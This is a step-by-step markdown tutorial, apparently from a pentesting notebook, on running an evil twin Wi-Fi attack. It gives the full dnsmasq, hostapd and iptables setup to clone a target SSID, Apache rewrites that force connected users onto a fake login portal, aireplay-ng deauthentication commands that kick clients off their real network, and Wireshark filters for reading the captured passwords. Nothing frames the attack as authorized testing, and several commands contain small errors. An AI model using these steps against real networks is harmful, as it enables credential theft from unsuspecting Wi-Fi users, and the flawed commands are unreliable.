This will be a walk through on performing an [Evil Twin wireless attack](https://www.varonis.com/blog/evil-twin-attack) and [Captive Portals](https://www.linksys.com/what-is-a-captive-portal.html).

An evil twin is a fake wireless access point(AP) that looks like a real one. The concept is to set up a malicious wireless network with the same SSID name as the target.

This is not required to have a WiFi Adapter that supports monitor mode, also known as packet injection. Though this will required if kicking clients off their network to connect to ours.

## Hardware

I myself have and recommend these adapters:

* [Alfa AWUS036ACM](https://www.amazon.com/Alfa-AWUS036ACM-Long-Range-Dual-Band-Wireless/dp/B073X6RL9D) <-- Capable of 2.4GHz and 5GHz
* [Alfa AWUS036ACHM](https://www.amazon.com/gp/product/B08SJBV1N3/ref=ox\_sc\_act\_title\_1?smid=A20G3A026MV70R\&psc=1) <-- Capable of 2.4GHz and 5GHz
* [Alfa AWUS036ACH](https://www.amazon.com/dp/B08SJC78FH?ref\_=cm\_sw\_r\_cp\_ud\_dp\_PSZZG6J9X0XH40GXB685) <-- Capable of 2.4GHz and 5GHz (This more than likely \*will\* require driver installation)
* [Panda Wireless PAU09 N600](https://www.amazon.com/Panda-Wireless-PAU09-Adapter-Antennas/dp/B01LY35HGO) <-- Capable of 2.4GHz and 5GHz
* [Alfa AWUS036NEH](https://www.amazon.com/AWUS036NEH-Range-WIRELESS-802-11b-USBAdapter/dp/B0035OCVO6)
* [Alfa AWUS036NH](https://www.amazon.com/Alfa-AWUS036NH-802-11g-Wireless-Long-Range/dp/B003YIFHJY)
* [Panda Wireless PAU05](https://www.amazon.com/Panda-300Mbps-Wireless-USB-Adapter/dp/B00EQT0YK2)
* [TP-Link TL-WN722N](https://www.amazon.com/TP-Link-TL-WN722N-Wireless-network-Adapter/dp/B002SZEOLG)
* [Ralink USB WiFi RT5370](https://www.amazon.com/Ralink-RT5370-Raspberry-Adapter-Function/dp/B019XUDHFC)

You can also use a device such as [WiFi Pineapple](https://shop.hak5.org/products/wifi-pineapple). This primarily works on open networks.

First we install the prerequisites

```
sudo apt install -y dnsmasq and hostapd aircrack-ng
```

## Finding target

First we find our target, I will target "Open-WiFi" in this example. we use airodump for this

```
sudo airodump-ng (interface) 
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Kill process that may interfere

```
sudo airmon-ng check kill
```

<figure><img src="../../.gitbook/assets/image (464).png" alt=""><figcaption></figcaption></figure>

now put the interface into monitor mode if we're deauthenticating a client.

```
sudo airmon-ng start (interface)
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Setup AP

Create `dnsmaqs.conf` file

```
# Set the wifi interface
interface=(interface)

# Set the IP range that can be given to clients
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,8h

# Set the gateway IP address
dhcp-option=3,10.0.0.1

# Set DNS server address
dhcp-option=6,10.0.0.1

# Set Server
server=8.8.8.8

# logs
log-queries
log-dhcp

# Redirect all requests to 10.0.0.1
#address=/#/10.0.0.1

# Redirect google to 10.0.0.1
#address=/google.com/10.0.0.1
#address=/www.google.com/10.0.0.1
#address=/google.com/www.google.com.com/10.0.0.1
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Note to uncomment lines. if we uncomment the `#address=/#/10.0.0.1` this will let clients connect but they will not get internet access as the pound sign(`#`) is a wildcard for dnsmasq. So they will connect to the AP, then immediately asked to sign-in with the Evil Portal that is setup.

So instead we can redirect websites back to our Evil Portal instead.

Create `hostapd.conf` and fill in with target info

```
interface=(interface)
driver=nl80211
ssid=(Target AP)
hw_mode=g
channel=(Target channel)
macaddr_acl=0
ignore_broadcast_ssid=0
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Assign the interface a gateway and netmask

```
sudo ifconfig (interface) up 10.0.0.1 netmask 255.255.255.0
```

Add the routing table

```
sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
```

Setup an easy script for IP with:

```
sudo iptables --flush
sudo iptables --table nat --append POSTROUTING --out-interface (internet interface) -j MASQUERADE 
sudo iptables --append FORWARD --in-interface (wireless interface) -j ACCEPT 
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I named mine IP-Tables.sh. Make it executable and run it

```
chmod +x IP-Tables.sh
sudo ./IP-Tables.sh
```

If you want the AP setup without using a captive portal, just run dnsmasq and hostapd

Start dnsmasq with

```
sudo dnsmasq -C (path/to/dnsmasq.conf)
```

Start hostapd with

```
sudo hostapd (path/to/hostapd.conf)
```

We can run the command with a -B at the end to push it to the background. Though if we do this, we don't see when a client connects

```
sudo hostapd (path/to/hostapd.conf) -B
```

### Captive Portals

Put your captive portal files, and put them in the `/var/www/html/` directory.

[Example Portals here](https://github.com/Th4ntis/Evil-Portals.git)

Edit `/etc/apache2/sites-enabled/000-default.conf` and add the following to the end

```
sudo nano /etc/apache2/sites-enabled/000-default.conf
```

```
<Directory "/var/www/html">
RewriteEngine On
RewriteBase /
RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
RewriteRule ^(.*)$ http://%1/$1 [R=301,L]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ / [L,QSA]
</Directory>
```

<figure><img src="../../.gitbook/assets/image (465).png" alt=""><figcaption></figcaption></figure>

Start the web server

```
sudo service apache2 start
```

Start dnsmasq with:

```
sudo dnsmasq -C (path/to/dnsmasq.conf)
```

Start hostapd AP with:

```
sudo hostapd (path/to/hostapd.conf)
```

We can run the command with a -B at the end to push it to the background. Though if we do this, we don't see when a client connects

```
sudo hostapd (path/to/hostapd.conf) -B
```

<figure><img src="../../.gitbook/assets/image (466).png" alt=""><figcaption></figcaption></figure>

Once we're ready, we can disconnect clients from their network to connect to ours with aireplay.

```
sudo aireplay-ng -0 0 -a (BSSID) (interface)
```

OR if we want to deauth a specific client:

```
sudo aireplay-ng -0 0 -a (bssid) -c (Client MAC Address) (interface)
```

the `-0 0` will send deauth packets continuously until stopped. we can change it to `-0 10` to send just 10 deauth packets.

## Post connection

Once they are connected, or even before, we can start intercepting traffic with whatever tools we want, like [Wireshark](../../networking/wireshark.md), [tshark](https://www.wireshark.org/docs/man-pages/tshark.html), [tcpdump](https://www.tcpdump.org/), etc. In this case I'll use wireshark on `wlan0`, the interface I was broadcasting from.

<figure><img src="../../.gitbook/assets/image (467).png" alt=""><figcaption></figcaption></figure>

As the user attempts to go to any page, they are taken to a login portal, asked enter a username/password on the portal and it will be captured.

We look for `HTTP Post Request` , then HTML Form URL Encoded, we will see their credentials.

<figure><img src="../../.gitbook/assets/image (468).png" alt=""><figcaption></figcaption></figure>

#### Wireshark to filter for packets

* `dns and ip.adr=(IP)` to see sites they are going to
* `frame contains (word)` will search for various words
* `http.request.method=="POST"` will show us login info.
